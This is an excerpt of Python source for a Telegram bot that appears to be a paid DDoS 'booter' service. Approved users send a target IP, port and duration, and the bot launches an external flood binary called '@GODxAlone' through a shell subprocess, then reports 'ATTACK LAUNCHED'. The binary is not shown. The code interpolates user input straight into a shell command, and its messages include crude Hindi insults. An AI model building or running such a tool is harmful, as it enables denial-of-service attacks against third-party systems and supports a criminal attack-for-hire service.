...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./@GODxAlone {target_ip} {target_port} {duration} 100")
...
def approve_or_disapprove_user(message):
    ...
    if not is_admin:
        bot.send_message(chat_id, "*🚫 ACCESS DENIED!*\n"
                                   "*YOU DON'T HAVE PERMISSION.*", parse_mode='Markdown')
        return
...
@bot.message_handler(commands=['aloneboy'])
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 ACCESS DENIED!*\n"  # Access Denied message
                                       ...
                                       "*DM OWNER :- @GODxAloneBOY.*", parse_mode='Markdown')  # Contact owner message
            return
        ...
        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ PLEASE WAIT!*\n"  # Busy message
                                       "*THE BOT IS BUSY /when *", parse_mode='Markdown')  # Check remaining time
            return

        bot.send_message(chat_id, "*🖕SEND ME IP PORT DURATION*", parse_mode='Markdown')  # Start chaos message
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*🩸 ATTACK LAUNCHED!🩸*\n\n"  # Attack launched message
                                           f"*🍆 HOST: {target_ip}*\n"  # Target host message
                                           f"*👙 PORT: {target_port}*\n"  # Target port message
                                           f"*⏰ DURATION: {duration} SECONDS*", parse_mode='Markdown')  # Duration message
...
def when_command(message):
    ...
    if bot.attack_in_progress:
        ...
        if remaining_time > 0:
            bot.send_message(chat_id, f"*REMAINING: {int(remaining_time)} seconds...*\n"
                                       "*INTEJAR KAR ITNA JALDI KYA HAI *", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*👙ATTACK COMPLETED👙*\n"
                                       "*FEEDBACK BHI BHEJ BHOSDI KE*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ KOYI ATTACK RUNNING NAHI LAUDE!*", parse_mode='Markdown')
...
def owner_command(message):
    response = ("* DM OWNNER :- @GODxAloneBOY*")
    bot.send_message(message.chat.id, response, parse_mode='Markdown')
